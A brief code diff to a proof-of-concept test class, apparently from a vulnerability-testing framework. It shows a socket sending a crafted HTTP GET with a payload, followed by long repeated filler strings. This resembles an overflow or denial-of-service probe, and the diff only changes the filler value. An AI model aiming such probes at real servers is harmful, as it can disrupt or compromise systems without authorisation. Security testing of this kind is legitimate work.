@@ -35,7 +35,7 @@ class TestPOC(POCBase):
             sock.send('GET /{} HTTP/1.0\r\n'.format(payload).encode('ascii'))
             sock.send('Host: 127.0.0.1\r\n'.encode('ascii'))
             sock.send('\r\n'.encode('ascii'))
-            str_five = 'testssdfsf' * 200
+            str_five = '010202030302' * 200
             sock.send(str_five.encode('ascii'))
             sock.send(str_five.encode('ascii'))
             sock.send(str_five.encode('ascii'))
